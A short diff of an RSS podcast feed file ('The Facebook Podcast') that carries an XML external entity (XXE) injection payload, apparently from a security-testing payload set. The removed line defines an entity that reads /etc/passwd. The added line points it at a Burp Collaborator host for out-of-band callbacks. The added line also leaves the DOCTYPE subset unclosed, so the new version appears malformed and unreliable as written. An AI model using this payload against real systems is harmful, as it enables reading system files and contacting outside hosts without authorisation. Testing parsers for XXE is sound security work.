@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE title [ <!ELEMENT title ANY >
-<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<!ENTITY xxe SYSTEM "https://nrif7qczunkoyobrdn84gxfqhhn8bx.burpcollaborator.net">
     <rss version="2.0" xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd">
       <channel>
         <title>The Facebook Podcast</title>
